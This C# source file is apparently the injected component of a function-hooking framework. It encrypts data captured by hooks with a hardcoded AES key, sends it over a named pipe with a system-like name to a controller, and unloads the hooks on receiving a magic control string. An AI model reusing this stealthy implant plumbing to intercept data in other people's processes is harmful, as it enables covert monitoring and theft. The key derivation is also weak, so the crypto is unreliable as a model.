using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Dendron
{
    class hDendron
    {
        // Globals
        //-----------
        public static String sDataPipe = "scerpcDSS";                                  // Sync in dendron & bates
        public static String sControlPipe = "MsFetWid";                                // Sync in dendron & bates
        public static String sAESKey = "P8CuaPrgwBjunvZxJcgq";                         // Sync in dendron & bates
        public static List<oleaccrt.LocalHook> lHook = new List<oleaccrt.LocalHook>(); // Global hook list
        public static readonly Object lockDataOperation = new Object();

        // Structs
        //-----------
        [StructLayout(LayoutKind.Sequential)]
        public struct HOOKDAT
        {
            public UInt32 iType;     // 0 == String; 1 == Byte[]; 2 == Fail decrypt; 3 == Fail Data
            public String sHookFunc; // Function where the data originated
            public String sHookData;
            public Byte[] bHookData;
        }

        // Helpers
        //-----------
        public static Byte[][] ComputeSha256KeyMat(String sInput)
        {
            Byte[][] res = new Byte[2][];
            Encoding enc = Encoding.UTF8;

            SHA256 sha256 = new SHA256CryptoServiceProvider();
            byte[] hashKey = sha256.ComputeHash(enc.GetBytes(sInput));
            byte[] hashIV = sha256.ComputeHash(enc.GetBytes(sInput));
            Array.Resize(ref hashIV, 16);

            res[0] = hashKey;
            res[1] = hashIV;

            return res;
        }

        public static Byte[] AES256EncryptToArray(Byte[] bInput, Byte[] bKey, Byte[] bIV)
        {
            Byte[] encrypted;

            using (AesManaged aesAlg = new AesManaged())
            {
                aesAlg.Key = bKey;
                aesAlg.IV = bIV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (BinaryWriter swEncrypt = new BinaryWriter(csEncrypt))
                        {
                            swEncrypt.Write(bInput);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return encrypted;
        }

        public static Byte[] ObjectToByteArray(HOOKDAT oHookDat)
        {
            //--- Array structure
            // [UInt32 Type]--[UInt32 Size]--[UTF8 sFuncName]--[UInt32 Size]--[Byte[] Hook data]
            //---

            // Create elements
            Byte[] bType = BitConverter.GetBytes(oHookDat.iType);

            Byte[] bSFunc = Encoding.UTF8.GetBytes(oHookDat.sHookFunc);
            Byte[] bISFunc = BitConverter.GetBytes((UInt32)bSFunc.Length);

            Byte[] bData;
            Byte[] bIData;
            if (oHookDat.iType == 0)
            {
                bData = Encoding.UTF8.GetBytes(oHookDat.sHookData);
                bIData = BitConverter.GetBytes((UInt32)bData.Length);
            } else
            {
                bData = oHookDat.bHookData;
                bIData = BitConverter.GetBytes((UInt32)bData.Length);
            }

            // Make array
            UInt32 iArrLen = (UInt32)(bType.Length + bSFunc.Length + bISFunc.Length + bData.Length + bIData.Length);
            Byte[] bResArray = new byte[iArrLen];

            // Populate array
            // --> Kind of ugly but ¯\_(ツ)_/¯
            Buffer.BlockCopy(bType, 0, bResArray, 0, bType.Length);
            Buffer.BlockCopy(bISFunc, 0, bResArray, bType.Length, bISFunc.Length);
            Buffer.BlockCopy(bSFunc, 0, bResArray, bType.Length + bISFunc.Length, bSFunc.Length);
            Buffer.BlockCopy(bIData, 0, bResArray, bType.Length + bISFunc.Length + bSFunc.Length, bIData.Length);
            Buffer.BlockCopy(bData, 0, bResArray, bType.Length + bISFunc.Length + bSFunc.Length + bIData.Length, bData.Length);

            return bResArray;
        }

        public static Byte[] arrayToAESArray(Byte[] bInput)
        {
            Byte[][] aSHAKeyMatt = ComputeSha256KeyMat(sAESKey);
            return AES256EncryptToArray(bInput, aSHAKeyMatt[0], aSHAKeyMatt[1]);
        }

        private static byte[] ReadMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }

        public static Byte[] DecryptArrayFromAES256(Byte[] bCipherText, Byte[] bKey, Byte[] bIV)
        {
            Byte[] bResult = { };
            try
            {
                using (Aes aesAlg = Aes.Create())
                using (MemoryStream output = new MemoryStream())
                {
                    aesAlg.Key = bKey;
                    aesAlg.IV = bIV;

                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(bCipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            Byte[] buffer = new Byte[1024];
                            Int32 read = csDecrypt.Read(buffer, 0, buffer.Length);
                            while (read > 0)
                            {
                                output.Write(buffer, 0, read);
                                read = csDecrypt.Read(buffer, 0, buffer.Length);
                            }
                            csDecrypt.Flush();
                            bResult = output.ToArray();
                        }
                    }
                }
                return bResult;
            }
            catch
            {
                return bResult;
            }
        }

        public static void listenControlPipe()
        {
            while (true)
            {
                var oPipe = new NamedPipeServerStream(sControlPipe, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message);
                oPipe.WaitForConnection();
                Byte[] messageBytes = ReadMessage(oPipe);

                // Process data
                Byte[][] aSHAKeyMatt = ComputeSha256KeyMat(sAESKey);
                Byte[] bDecrypt = DecryptArrayFromAES256(messageBytes, aSHAKeyMatt[0], aSHAKeyMatt[1]);

                // Magic data
                String sMagic = String.Empty;
                try
                {
                    sMagic = Encoding.UTF8.GetString(bDecrypt);
                }
                catch { }

                if (sMagic == "Dendrobate")
                {
                    // Remove hooks
                    foreach (oleaccrt.LocalHook oHook in lHook)
                    {
                        oHook.Dispose();
                        oleaccrt.LocalHook.Release();
                    }

                    // Exit thread
                    break;
                }
            }
        }

        public static Boolean passHookDataByPipe(HOOKDAT oHookDat)
        {
            lock(lockDataOperation)
            {
                try
                {
                    NamedPipeClientStream pipe = new NamedPipeClientStream("localhost", sDataPipe, PipeDirection.InOut);
                    try
                    {
                        // Can we connect to the pipe?
                        pipe.Connect(50); // Unclear if we need a small buffer time here
                        pipe.ReadMode = PipeTransmissionMode.Message;

                        // Turn object into byte array
                        Byte[] bStruct = ObjectToByteArray(oHookDat);

                        // Write data
                        Byte[] ecnHookDat = arrayToAESArray(bStruct);
                        pipe.Write(ecnHookDat, 0, ecnHookDat.Length);
                        pipe.Close();

                        return true;
                    }
                    catch
                    {
                        pipe.Close();
                        return false;
                    }
                } catch
                {
                    return false;
                }
            }
        }
    }
}
